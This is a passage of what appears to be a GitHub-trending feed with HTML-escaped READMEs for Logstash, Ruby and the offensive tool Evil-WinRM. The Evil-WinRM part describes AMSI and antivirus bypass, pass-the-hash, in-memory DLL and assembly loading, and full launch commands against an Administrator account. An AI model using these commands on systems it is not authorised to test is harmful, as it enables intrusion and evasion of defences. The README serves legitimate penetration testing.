--development&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Building Artifacts&lt;/h2&gt; &#xA;&lt;p&gt;Built artifacts will be placed in the &lt;code&gt;LS_HOME/build&lt;/code&gt; directory, and will create the directory if it is not already present.&lt;/p&gt; &#xA;&lt;p&gt;You can build a Logstash snapshot package as tarball or zip file&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;./gradlew assembleTarDistribution&#xA;./gradlew assembleZipDistribution&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;OSS-only artifacts can similarly be built with their own gradle tasks:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;./gradlew assembleOssTarDistribution&#xA;./gradlew assembleOssZipDistribution&#xA;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;You can also build .rpm and .deb, but the &lt;a href=&#34;https://github.com/jordansissel/fpm&#34;&gt;fpm&lt;/a&gt; tool is required.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;rake artifact:rpm&#xA;rake artifact:deb&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;and:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;rake artifact:rpm_oss&#xA;rake artifact:deb_oss&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Using a Custom JRuby Distribution&lt;/h2&gt; &#xA;&lt;p&gt;If you want the build to use a custom JRuby you can do so by setting a path to a custom JRuby distribution&#39;s source root via the &lt;code&gt;custom.jruby.path&lt;/code&gt; Gradle property.&lt;/p&gt; &#xA;&lt;p&gt;E.g.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;./gradlew clean test -Pcustom.jruby.path=&#34;/path/to/jruby&#34;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Project Principles&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Community: If a newbie has a bad time, it&#39;s a bug.&lt;/li&gt; &#xA; &lt;li&gt;Software: Make it work, then make it right, then make it fast.&lt;/li&gt; &#xA; &lt;li&gt;Technology: If it doesn&#39;t do a thing today, we can make it do it tomorrow.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Contributing&lt;/h2&gt; &#xA;&lt;p&gt;All contributions are welcome: ideas, patches, documentation, bug reports, complaints, and even something you drew up on a napkin.&lt;/p&gt; &#xA;&lt;p&gt;Programming is not a required skill. Whatever you&#39;ve seen about open source and maintainers or community members saying &#34;send patches or die&#34; - you will not see that here.&lt;/p&gt; &#xA;&lt;p&gt;It is more important to me that you are able to contribute.&lt;/p&gt; &#xA;&lt;p&gt;For more information about contributing, see the &lt;a href=&#34;https://raw.githubusercontent.com/elastic/logstash/main/CONTRIBUTING.md&#34;&gt;CONTRIBUTING&lt;/a&gt; file.&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>ruby/ruby</title>
    <updated>2022-05-30T01:32:15Z</updated>
    <id>tag:github.com,2022-05-30:/ruby/ruby</id>
    <link href="https://github.com/ruby/ruby" rel="alternate"></link>
    <summary type="html">&lt;p&gt;The Ruby Programming Language [mirror]&lt;/p&gt;&lt;hr&gt;&lt;p&gt;&lt;a href=&#34;https://github.com/ruby/ruby/actions?query=workflow%3A%22MinGW%22&#34;&gt;&lt;img src=&#34;https://github.com/ruby/ruby/workflows/MinGW/badge.svg?sanitize=true&#34; alt=&#34;Actions Status: MinGW&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://github.com/ruby/ruby/actions?query=workflow%3A%22MJIT%22&#34;&gt;&lt;img src=&#34;https://github.com/ruby/ruby/workflows/MJIT/badge.svg?sanitize=true&#34; alt=&#34;Actions Status: MJIT&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://github.com/ruby/ruby/actions?query=workflow%3A%22Ubuntu%22&#34;&gt;&lt;img src=&#34;https://github.com/ruby/ruby/workflows/Ubuntu/badge.svg?sanitize=true&#34; alt=&#34;Actions Status: Ubuntu&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://github.com/ruby/ruby/actions?query=workflow%3A%22Windows%22&#34;&gt;&lt;img src=&#34;https://github.com/ruby/ruby/workflows/Windows/badge.svg?sanitize=true&#34; alt=&#34;Actions Status: Windows&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://ci.appveyor.com/project/ruby/ruby/branch/master&#34;&gt;&lt;img src=&#34;https://ci.appveyor.com/api/projects/status/0sy8rrxut4o0k960/branch/master?svg=true&#34; alt=&#34;AppVeyor status&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://app.travis-ci.com/ruby/ruby&#34;&gt;&lt;img src=&#34;https://app.travis-ci.com/ruby/ruby.svg?branch=master&#34; alt=&#34;Travis Status&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://cirrus-ci.com/github/ruby/ruby/master&#34;&gt;&lt;img src=&#34;https://api.cirrus-ci.com/github/ruby/ruby.svg?sanitize=true&#34; alt=&#34;Cirrus Status&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h1&gt;What is Ruby?&lt;/h1&gt; &#xA;&lt;p&gt;Ruby is an interpreted object-oriented programming language often used for web development. It also offers many scripting features to process plain text and serialized files, or manage system tasks. It is simple, straightforward, and extensible.&lt;/p&gt; &#xA;&lt;h2&gt;Features of Ruby&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Simple Syntax&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Normal&lt;/strong&gt; Object-oriented Features (e.g. class, method calls)&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Advanced&lt;/strong&gt; Object-oriented Features (e.g. mix-in, singleton-method)&lt;/li&gt; &#xA; &lt;li&gt;Operator Overloading&lt;/li&gt; &#xA; &lt;li&gt;Exception Handling&lt;/li&gt; &#xA; &lt;li&gt;Iterators and Closures&lt;/li&gt; &#xA; &lt;li&gt;Garbage Collection&lt;/li&gt; &#xA; &lt;li&gt;Dynamic Loading of Object Files (on some architectures)&lt;/li&gt; &#xA; &lt;li&gt;Highly Portable (works on many Unix-like/POSIX compatible platforms as well as Windows, macOS, etc.) cf. &lt;a href=&#34;https://github.com/ruby/ruby/raw/master/doc/maintainers.rdoc#label-Platform+Maintainers&#34;&gt;https://github.com/ruby/ruby/blob/master/doc/maintainers.rdoc#label-Platform+Maintainers&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;How to get Ruby with Git&lt;/h2&gt; &#xA;&lt;p&gt;For a complete list of ways to install Ruby, including using third-party tools like rvm, see:&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://www.ruby-lang.org/en/downloads/&#34;&gt;https://www.ruby-lang.org/en/downloads/&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;The mirror of the Ruby source tree can be checked out with the following command:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;$ git clone https://github.com/ruby/ruby.git&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;There are some other branches under development. Try the following command to see the list of branches:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;$ git ls-remote https://github.com/ruby/ruby.git&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;You may also want to use &lt;a href=&#34;https://git.ruby-lang.org/ruby.git&#34;&gt;https://git.ruby-lang.org/ruby.git&lt;/a&gt; (actual master of Ruby source) if you are a committer.&lt;/p&gt; &#xA;&lt;h2&gt;Ruby home page&lt;/h2&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://www.ruby-lang.org/&#34;&gt;https://www.ruby-lang.org/&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Documentation&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://docs.ruby-lang.org/en/master/index.html&#34;&gt;English&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://docs.ruby-lang.org/ja/master/index.html&#34;&gt;Japanese&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Mailing list&lt;/h2&gt; &#xA;&lt;p&gt;There is a mailing list to discuss Ruby. To subscribe to this list, please send the following phrase:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;subscribe&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;in the mail body (not subject) to the address &lt;a href=&#34;mailto:ruby-talk-request@ruby-lang.org?subject=Join%20Ruby%20Mailing%20List&amp;amp;body=subscribe&#34;&gt;ruby-talk-request@ruby-lang.org&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;Copying&lt;/h2&gt; &#xA;&lt;p&gt;See the file &lt;a href=&#34;rdoc-ref:COPYING&#34;&gt;COPYING&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;Feedback&lt;/h2&gt; &#xA;&lt;p&gt;Questions about the Ruby language can be asked on the &lt;a href=&#34;https://www.ruby-lang.org/en/community/mailing-lists&#34;&gt;Ruby-Talk&lt;/a&gt; mailing list or on websites like &lt;a href=&#34;https://stackoverflow.com&#34;&gt;https://stackoverflow.com&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;Bugs should be reported at &lt;a href=&#34;https://bugs.ruby-lang.org&#34;&gt;https://bugs.ruby-lang.org&lt;/a&gt;. Read &lt;a href=&#34;https://docs.ruby-lang.org/en/master/reporting_issues_md.html&#34;&gt;&#34;Reporting Issues&#34;&lt;/a&gt; for more information.&lt;/p&gt; &#xA;&lt;h2&gt;Contributing&lt;/h2&gt; &#xA;&lt;p&gt;See &lt;a href=&#34;https://docs.ruby-lang.org/en/master/contributing_md.html&#34;&gt;&#34;Contributing to Ruby&#34;&lt;/a&gt;, which includes setup and build instructions.&lt;/p&gt; &#xA;&lt;h2&gt;The Author&lt;/h2&gt; &#xA;&lt;p&gt;Ruby was originally designed and developed by Yukihiro Matsumoto (Matz) in 1995.&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;mailto:matz@ruby-lang.org&#34;&gt;matz@ruby-lang.org&lt;/a&gt;&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>Hackplayers/evil-winrm</title>
    <updated>2022-05-30T01:32:15Z</updated>
    <id>tag:github.com,2022-05-30:/Hackplayers/evil-winrm</id>
    <link href="https://github.com/Hackplayers/evil-winrm" rel="alternate"></link>
    <summary type="html">&lt;p&gt;The ultimate WinRM shell for hacking/pentesting&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Evil-WinRM &lt;a href=&#34;https://raw.githubusercontent.com/Hackplayers/evil-winrm/master/evil-winrm.rb&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/version-3.3-blue.svg?style=flat-square&amp;amp;colorA=273133&amp;amp;colorB=0093ee&#34; alt=&#34;Version-shield&#34; title=&#34;Latest version&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://www.ruby-lang.org/en/news/2015/12/25/ruby-2-3-0-released/&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/ruby-2.3%2B-blue.svg?style=flat-square&amp;amp;colorA=273133&amp;amp;colorB=ff0000&#34; alt=&#34;Ruby2.3-shield&#34; title=&#34;Ruby 2.3 or later&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://rubygems.org/gems/evil-winrm&#34;&gt;&lt;img src=&#34;https://badge.fury.io/rb/evil-winrm.svg?sanitize=true&#34; alt=&#34;Gem-Version&#34; title=&#34;Ruby gem&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://raw.githubusercontent.com/Hackplayers/evil-winrm/master/LICENSE&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/license-LGPL%20v3%2B-blue.svg?style=flat-square&amp;amp;colorA=273133&amp;amp;colorB=bd0000&#34; alt=&#34;License-shield&#34; title=&#34;LGPL v3+&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://hub.docker.com/r/oscarakaelvis/evil-winrm&#34;&gt;&lt;img src=&#34;https://img.shields.io/docker/cloud/automated/oscarakaelvis/evil-winrm.svg?style=flat-square&amp;amp;colorA=273133&amp;amp;colorB=a9a9a9&#34; alt=&#34;Docker-shield&#34; title=&#34;Docker rules!&#34;&gt;&lt;/a&gt;&lt;/h1&gt; &#xA;&lt;p&gt;The ultimate WinRM shell for hacking/pentesting&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/Hackplayers/evil-winrm/master/resources/evil-winrm_logo.png&#34; alt=&#34;Banner&#34;&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Description &amp;amp; Purpose&lt;/h2&gt; &#xA;&lt;p&gt;This shell is the ultimate WinRM shell for hacking/pentesting.&lt;/p&gt; &#xA;&lt;p&gt;WinRM (Windows Remote Management) is the Microsoft implementation of WS-Management Protocol. A standard SOAP based protocol that allows hardware and operating systems from different vendors to interoperate. Microsoft included it in their Operating Systems in order to make life easier to system administrators.&lt;/p&gt; &#xA;&lt;p&gt;This program can be used on any Microsoft Windows Servers with this feature enabled (usually at port 5985), of course only if you have credentials and permissions to use it. So we can say that it could be used in a post-exploitation hacking/pentesting phase. The purpose of this program is to provide nice and easy-to-use features for hacking. It can be used with legitimate purposes by system administrators as well but the most of its features are focused on hacking/pentesting stuff.&lt;/p&gt; &#xA;&lt;p&gt;It is based mainly in the WinRM Ruby library which changed its way to work since its version 2.0. Now instead of using WinRM protocol, it is using PSRP (Powershell Remoting Protocol) for initializing runspace pools as well as creating and processing pipelines.&lt;/p&gt; &#xA;&lt;h2&gt;Features&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Compatible to Linux and Windows client systems&lt;/li&gt; &#xA; &lt;li&gt;Load in memory Powershell scripts&lt;/li&gt; &#xA; &lt;li&gt;Load in memory dll files bypassing some AVs&lt;/li&gt; &#xA; &lt;li&gt;Load in memory C# (C Sharp) assemblies bypassing some AVs&lt;/li&gt; &#xA; &lt;li&gt;Load x64 payloads generated with awesome &lt;a href=&#34;https://github.com/TheWover/donut&#34;&gt;donut&lt;/a&gt; technique&lt;/li&gt; &#xA; &lt;li&gt;Dynamic AMSI Bypass to avoid AV signatures&lt;/li&gt; &#xA; &lt;li&gt;Pass-the-hash support&lt;/li&gt; &#xA; &lt;li&gt;Kerberos auth support&lt;/li&gt; &#xA; &lt;li&gt;SSL and certificates support&lt;/li&gt; &#xA; &lt;li&gt;Upload and download files showing progress bar&lt;/li&gt; &#xA; &lt;li&gt;List remote machine services without privileges&lt;/li&gt; &#xA; &lt;li&gt;Command History&lt;/li&gt; &#xA; &lt;li&gt;WinRM command completion&lt;/li&gt; &#xA; &lt;li&gt;Local files/directories completion&lt;/li&gt; &#xA; &lt;li&gt;Remote path (files/directories) completion (can be disabled optionally)&lt;/li&gt; &#xA; &lt;li&gt;Colorization on prompt and output messages (can be disabled optionally)&lt;/li&gt; &#xA; &lt;li&gt;Optional logging feature&lt;/li&gt; &#xA; &lt;li&gt;Docker support (prebuilt images available at &lt;a href=&#34;https://hub.docker.com/r/oscarakaelvis/evil-winrm&#34;&gt;Dockerhub&lt;/a&gt;)&lt;/li&gt; &#xA; &lt;li&gt;Trap capturing to avoid accidental shell exit on Ctrl+C&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Help&lt;/h2&gt; &#xA;&lt;pre&gt;&lt;code&gt;Usage: evil-winrm -i IP -u USER [-s SCRIPTS_PATH] [-e EXES_PATH] [-P PORT] [-p PASS] [-H HASH] [-U URL] [-S] [-c PUBLIC_KEY_PATH ] [-k PRIVATE_KEY_PATH ] [-r REALM] [--spn SPN_PREFIX] [-l]&#xA;    -S, --ssl                        Enable ssl&#xA;    -c, --pub-key PUBLIC_KEY_PATH    Local path to public key certificate&#xA;    -k, --priv-key PRIVATE_KEY_PATH  Local path to private key certificate&#xA;    -r, --realm DOMAIN               Kerberos auth, it has to be set also in /etc/krb5.conf file using this format -&amp;gt; CONTOSO.COM = { kdc = fooserver.contoso.com }&#xA;    -s, --scripts PS_SCRIPTS_PATH    Powershell scripts local path&#xA;        --spn SPN_PREFIX             SPN prefix for Kerberos auth (default HTTP)&#xA;    -e, --executables EXES_PATH      C# executables local path&#xA;    -i, --ip IP                      Remote host IP or hostname. FQDN for Kerberos auth (required)&#xA;    -U, --url URL                    Remote url endpoint (default /wsman)&#xA;    -u, --user USER                  Username (required if not using kerberos)&#xA;    -p, --password PASS              Password&#xA;    -H, --hash HASH                  NTHash&#xA;    -P, --port PORT                  Remote host port (default 5985)&#xA;    -V, --version                    Show version&#xA;    -n, --no-colors                  Disable colors&#xA;    -N, --no-rpath-completion        Disable remote path completion&#xA;    -l, --log                        Log the WinRM session&#xA;    -h, --help                       Display this help message&#xA;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Requirements&lt;/h2&gt; &#xA;&lt;p&gt;Ruby 2.3 or higher is needed. Some ruby gems are needed as well: &lt;code&gt;winrm &amp;gt;=2.3.2&lt;/code&gt;, &lt;code&gt;winrm-fs &amp;gt;=1.3.2&lt;/code&gt;, &lt;code&gt;stringio &amp;gt;=0.0.2&lt;/code&gt;, &lt;code&gt;logger &amp;gt;= 1.4.3&lt;/code&gt;, &lt;code&gt;fileutils &amp;gt;= 0.7.2&lt;/code&gt;. Depending of your installation method (4 availables) the installation of them could be required to be done manually.&lt;/p&gt; &#xA;&lt;p&gt;Another important requirement only used for Kerberos auth is to install the Kerberos package used for network authentication. For some Linux like Debian based (Kali, Parrot, etc.) it is called &lt;code&gt;krb5-user&lt;/code&gt;. For BlackArch it is called &lt;code&gt;krb5&lt;/code&gt; and probably it could be called in a different way for other Linux distributions.&lt;/p&gt; &#xA;&lt;p&gt;The remote path completion feature will work only if your ruby was compiled enabling the &lt;code&gt;--with-readline-dir&lt;/code&gt; flag. This is enabled by default in ruby included on some Linux distributions but not in all. Check &lt;a href=&#34;https://raw.githubusercontent.com/Hackplayers/evil-winrm/master/#Remote-path-completion&#34;&gt;the section below&lt;/a&gt; for more info.&lt;/p&gt; &#xA;&lt;h2&gt;Installation &amp;amp; Quick Start (4 methods)&lt;/h2&gt; &#xA;&lt;h3&gt;Method 1. Installation directly as ruby gem (dependencies will be installed automatically on your system)&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Step 1. Install it (it will install automatically dependencies): &lt;code&gt;gem install evil-winrm&lt;/code&gt;&lt;/li&gt; &#xA; &lt;li&gt;Step 2. Ready. Just launch it!&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;pre&gt;&lt;code&gt;evil-winrm  -i 192.168.1.100 -u Administrator -p &#39;MySuperSecr3tPass123!&#39; -s &#39;/home/foo/ps1_scripts/&#39; -e &#39;/home/foo/exe_files/&#39;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Method 2. Git clone and install dependencies on your system manually&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Step 1. Install dependencies manually: &lt;code&gt;sudo gem install winrm winrm-fs stringio logger fileutils&lt;/code&gt;&lt;/li&gt; &#xA; &lt;li&gt;Step 2. Clone the repo: &lt;code&gt;git clone https://github.com/Hackplayers/evil-winrm.git&lt;/code&gt;&lt;/li&gt; &#xA; &lt;li&gt;Step 3. Ready. Just launch it!&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;pre&gt;&lt;code&gt;cd evil-winrm &amp;amp;&amp;amp; ruby evil-winrm.rb -i 192.168.1.100 -u Administrator -p &#39;MySuperSecr3tPass123!&#39; -s &#39;/home/foo/ps1_scripts/&#39; -e &#39;/home/foo/exe_files/&#39;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Method 3. Using bundler (dependencies will not be installed on your system, just to use evil-winrm)&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Step 1. Install bundler: &lt;code&gt;gem install bundler&lt;/code&gt;&lt;/li&gt; &#xA; &lt;li&gt;Step 2. Clone the repo: &lt;code&gt;git clone https://github.com/Hackplayers/evil-winrm.git&lt;/code&gt;&lt;/li&gt; &#xA; &lt;li&gt;Step 3. Install dependencies with bundler: &lt;code&gt;cd evil-winrm &amp;amp;&amp;amp; bundle install --path vendor/bundle&lt;/code&gt;&lt;/li&gt; &#xA; &lt;li&gt;Step 4. Launch it with bundler:&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;pre&gt;&lt;code&gt;bundle exec evil-winrm.rb -i 192.168.1.100 -u Administrator -p &#39;MySuperSecr3tPass123!&#39; -s &#39;/home/foo/ps1_scripts/&#39; -e &#39;/home/foo/exe_files/&#39;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Method 4. Using Docker&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Step 1. Launch docker container based on already built image:&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;pre&gt;&lt;code&gt;docker run --rm -ti --name evil-winrm -v /home/foo/ps1_scripts:/ps1_scripts -v /home/foo/exe_files:/exe_files -v /home/foo/data:/data oscarakaelvis/evil-winrm -i 192.168.1.100 -u Administrator -p &#39;MySuperSecr3tPass123!&#39; -s &#39;/ps1_scripts/&#39; -e &#39;/exe_files/&#39;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Documentation&lt;/h2&gt; &#xA;&lt;h3&gt;Clear text password&lt;/h3&gt; &#xA;&lt;p&gt;If you don&#39;t want to put the password in clear text, you can optionally avoid to set &lt;code&gt;-p&lt;/code&gt; argument and the password will be prompted preventing to be shown.&lt;/p&gt; &#xA;&lt;h3&gt;Ipv6&lt;/h3&gt; &#xA;&lt;p&gt;To use IPv6, the address must be added to /etc/hosts. Just put the already set name of the host after &lt;code&gt;-i&lt;/code&gt; argument instead of an IP address.&lt;/p&gt; &#xA;&lt;h3&gt;Basic commands&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;strong&gt;upload&lt;/strong&gt;: local files can be auto-completed using tab key. &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;usage: &lt;code&gt;upload local_filename&lt;/code&gt; or &lt;code&gt;upload local_filename destination_filename&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;download&lt;/strong&gt;: &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;usage: &lt;code&gt;download remote_filename&lt;/code&gt; or &lt;code&gt;download remote_filename destination_filename&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;&lt;strong&gt;Notes about paths (upload/download)&lt;/strong&gt;: Relative paths are not allowed to use on download/upload. Use filenames on current directory or absolute path. If you are using Evil-WinRM in a docker environment, bear in mind that all local paths should be at &lt;code&gt;/data&lt;/code&gt; and be pretty sure that you mapped it as a volume in order to be able to access to downloaded files or to be able to upload files from your local host O.S.&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;strong&gt;services&lt;/strong&gt;: list all services showing if there your account has permissions over each one. No administrator permissions needed to use this feature.&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;menu&lt;/strong&gt;: load the &lt;code&gt;Invoke-Binary&lt;/code&gt;, &lt;code&gt;Dll-Loader&lt;/code&gt; and &lt;code&gt;Donut-Loader&lt;/code&gt; functions that we will explain below. When a ps1 is loaded all its functions will be shown up.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;pre&gt;&lt;code&gt;*Evil-WinRM* PS C:\&amp;gt; menu&#xA;&#xA;   ,.   (   .      )               &#34;            ,.   (   .      )       .&#xA;  (&#34;  (  )  )&#39;     ,&#39;             (     &#39;    (&#34;     )  )&#39;     ,&#39;   .  ,)&#xA;.; )  &#39; (( (&#34; )    ;(,      .     ;)  &#34;  )&#34;  .; )  &#39; (( (&#34; )   );(,   )((&#xA;_&#34;.,_,.__).,) (.._( ._),     )  , (._..( &#39;.._&#34;._, . &#39;._)_(..,_(_&#34;.) _( _&#39;)&#xA;\_   _____/__  _|__|  |    ((  (  /  \    /  \__| ____\______   \  /     \&#xA; |    __)_\  \/ /  |  |    ;_)_&#39;) \   \/\/   /  |/    \|       _/ /  \ /  \&#xA; |        \\   /|  |  |__ /_____/  \        /|  |   |  \    |   \/    Y    \&#xA;/_______  / \_/ |__|____/           \__/\  / |__|___|  /____|_  /\____|__  /&#xA;        \/                               \/          \/       \/         \/&#xA;&#xA;          By: CyberVaca, OscarAkaElvis, Jarilaos, Arale61 @Hackplayers&#xA;&#xA;[+] Dll-Loader&#xA;[+] Donut-Loader&#xA;[+] Invoke-Binary&#xA;[+] Bypass-4MSI&#xA;[+] services&#xA;[+] upload&#xA;[+] download&#xA;[+] menu&#xA;[+] exit&#xA;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Load powershell scripts&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;To load a ps1 file you just have to type the name (auto-completion using tab allowed). The scripts must be in the path set at &lt;code&gt;-s&lt;/code&gt; argument. Type menu again and see the loaded functions. Very large files can take a long time to be loaded.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;pre&gt;&lt;code&gt;*Evil-WinRM* PS C:\&amp;gt; PowerView.ps1&#xA;*Evil-WinRM* PS C:\&amp;gt; menu&#xA;&#xA;   ,.   (   .      )               &#34;            ,.   (   .      )       .&#xA;  (&#34;  (  )  )&#39;     ,&#39;             (     &#39;    (&#34;     )  )&#39;     ,&#39;   .  ,)&#xA;.; )  &#39; (( (&#34; )    ;(,      .     ;)  &#34;  )&#34;  .; )  &#39; (( (&#34; )   );(,   )((&#xA;_&#34;.,_,.__).,) (.._( ._),     )  , (._..( &#39;.._&#34;._, . &#39;._)_(..,_(_&#34;.) _( _&#39;)&#xA;\_   _____/__  _|__|  |    ((  (  /  \    /  \__| ____\______   \  /     \&#xA; |    __)_\  \/ /  |  |    ;_)_&#39;) \   \/\/   /  |/    \|       _/ /  \ /  \&#xA; |        \\   /|  |  |__ /_____/  \        /|  |   |  \    |   \/    Y    \&#xA;/_______  / \_/ |__|____/           \__/\  / |__|___|  /____|_  /\____|__  /&#xA;        \/                               \/          \/       \/         \/&#xA;&#xA;          By: CyberVaca, OscarAkaElvis, Jarilaos, Arale61 @Hackplayers&#xA;&#xA;[+] Add-DomainAltSecurityIdentity&#xA;[+] Add-DomainGroupMember&#xA;[+] Add-DomainObjectAcl&#xA;[+] Add-RemoteConnection&#xA;[+] Add-Win32Type&#xA;[+] Convert-ADName&#xA;[+] Convert-DNSRecord&#xA;[+] ConvertFrom-LDAPLogonHours&#xA;[+] ConvertFrom-SID&#xA;[+] ConvertFrom-UACValue&#xA;[+] Convert-LDAPProperty&#xA;[+] Convert-LogonHours&#xA;[+] ConvertTo-SID&#xA;[+] Dll-Loader&#xA;[+] Donut-Loader&#xA;[+] Export-PowerViewCSV&#xA;[+] field&#xA;[+] Find-DomainLocalGroupMember&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Advanced commands&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Invoke-Binary: allows .Net assemblies to be executed in memory. The name can be auto-completed using tab key. Arguments for the exe file can be passed comma separated. Example: &lt;code&gt;Invoke-Binary /opt/csharp/Binary.exe &#39;param1, param2, param3&#39;&lt;/code&gt;. The executables must be in the path set at &lt;code&gt;-e&lt;/code&gt; argument.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;pre&gt;&lt;code&gt;*Evil-WinRM* PS C:\&amp;gt; Invoke-Binary&#xA;.SYNOPSIS&#xA;    Execute binaries from memory.&#xA;    PowerShell Function: Invoke-Binary&#xA;    Author: Luis Vacas (CyberVaca)&#xA;&#xA;    Required dependencies: None&#xA;    Optional dependencies: None&#xA;.DESCRIPTION&#xA;&#xA;.EXAMPLE&#xA;    Invoke-Binary /opt/csharp/Watson.exe&#xA;    Invoke-Binary /opt/csharp/Binary.exe param1,param2,param3&#xA;    Invoke-Binary /opt/csharp/Binary.exe &#39;param1, param2, param3&#39;&#xA;    Description&#xA;    -----------&#xA;    Function that execute binaries from memory.&#xA;&#xA;*Evil-WinRM* PS C:\&amp;gt; Invoke-Binary /opt/csharp/Rubeus.exe&#xA;&#xA;   ______        _&#xA;  (_____ \      | |&#xA;   _____) )_   _| |__  _____ _   _  ___&#xA;  |  __  /| | | |  _ \| ___ | | | |/___)&#xA;  | |  \ \| |_| | |_) ) ____| |_| |___ |&#xA;  |_|   |_|____/|____/|_____)____/(___/&#xA;&#xA;  v2.0.0&#xA;&#xA;&#xA; Ticket requests and renewals:&#xA;&#xA;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;Dll-Loader: allows loading dll libraries in memory, it is equivalent to: &lt;code&gt;[Reflection.Assembly]::Load([IO.File]::ReadAllBytes(&#34;pwn.dll&#34;))&lt;/code&gt;&lt;/p&gt; &lt;p&gt;The dll file can be hosted by smb, http or locally. Once it is loaded type &lt;code&gt;menu&lt;/code&gt;, then it is possible to autocomplete all functions.&lt;/p&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; 